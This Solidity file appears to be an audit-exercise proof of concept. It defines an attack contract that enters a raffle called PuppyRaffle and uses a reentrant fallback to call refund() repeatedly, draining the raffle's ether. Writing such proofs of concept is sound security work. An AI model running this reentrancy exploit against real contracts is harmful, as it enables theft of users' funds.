// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "./PuppyRaffle.sol";
import {console} from "forge-std/Test.sol";

contract AttackContract {
    PuppyRaffle public puppyRaffle;
    uint256 public receivedEther;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
    }

    function attack() public payable {
        console.log("entering attack...");
        require(msg.value > 0, "attack must include a value");

        // Create a dynamic array and push the sender's address
        address[] memory players = new address[](1);
        players[0] = address(this);

        console.log("entering enterRaffle from attack function...");
        puppyRaffle.enterRaffle{value: msg.value}(players);


        uint256 activePlayerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        console.log("activePlayerIndex:", activePlayerIndex);

        puppyRaffle.refund(activePlayerIndex);
    }


    fallback() external payable {
        console.log("entering fallback...");
        if (address(puppyRaffle).balance >= msg.value) {
            receivedEther += msg.value;
            console.log("value of receivedEther:", receivedEther);

            // Find the index of the sender's address
            uint256 playerIndex = puppyRaffle.getActivePlayerIndex(address(this));

            if (playerIndex > 0) {
                // Refund the sender if they are in the raffle
                puppyRaffle.refund(playerIndex);
            }
        }
    }
}